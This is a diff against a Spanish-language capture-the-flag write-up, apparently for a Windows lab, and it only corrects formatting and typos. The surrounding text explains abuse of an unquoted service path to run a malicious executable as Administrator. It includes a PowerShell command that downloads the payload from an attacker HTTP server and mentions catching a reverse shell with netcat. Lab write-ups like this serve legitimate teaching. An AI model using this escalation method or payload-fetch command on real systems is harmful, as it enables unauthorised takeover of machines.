@@ -112,8 +112,8 @@ Es decir, se detiene en el primer espacio y añade la terminación **.exe**. Si 
 	
 Y así sucesivamente. Creo que se entiende la idea, ahora, ¿cómo me aprovecho de esto para comprometer el equipo? Todos los servicios corren bajo el usuario **Administrator**, por lo tanto, si se cumplen los siguientes requisitos:
 
-	1. Tener permisos de escritura en algún directorio del path donde se ubica el ejecutable del servicio
-	2. Tener permisos para reiniciar dicho servicio
+1. Tener permisos de escritura en algún directorio del path donde se ubica el ejecutable del servicio
+2. Tener permisos para reiniciar dicho servicio
 	
 Entonces podemos colocar un ejecutable malicioso que ejecute alguna acción (como una reverse shell) y este será ejecutado por el usuario **Administrator** cuando nosotros reiniciemos el servicio.
 
@@ -135,7 +135,7 @@ En este caso, sí tenemos permisos de escritura dentro del directorio **IObit**,
 	
 ![12]
 
-Con el ejecutable ya listo, ahora debemos moverlo a la máquina, específicamente el directorio **IObit**. Para ello, volvemos a iniciar un servidor HTTP con **Python** y ejecutamos la instrucción **Invoke-WebRequest** de PowerShell:
+Con el ejecutable ya listo, ahora debemos moverlo a la máquina, específicamente en el directorio **IObit**. Para ello, volvemos a iniciar un servidor HTTP con **Python** y ejecutamos la instrucción **Invoke-WebRequest** de PowerShell:
 
 	iwr -uri "http://10.10.188.83:8080/Advanced.exe" -outfile "Advanced.exe"
 	
@@ -169,7 +169,7 @@ Si ahora nos vamos a nuestra termina con **netcat** veremos que hemos recibido u
 
 ![17]
 
-Por último, solo nos resta mostrar la flag de root. COn esto, hemos terminado de comprometer la máquina.
+Por último, solo nos resta mostrar la flag de root. Con esto, hemos terminado de comprometer la máquina.
 
 ![18]
 
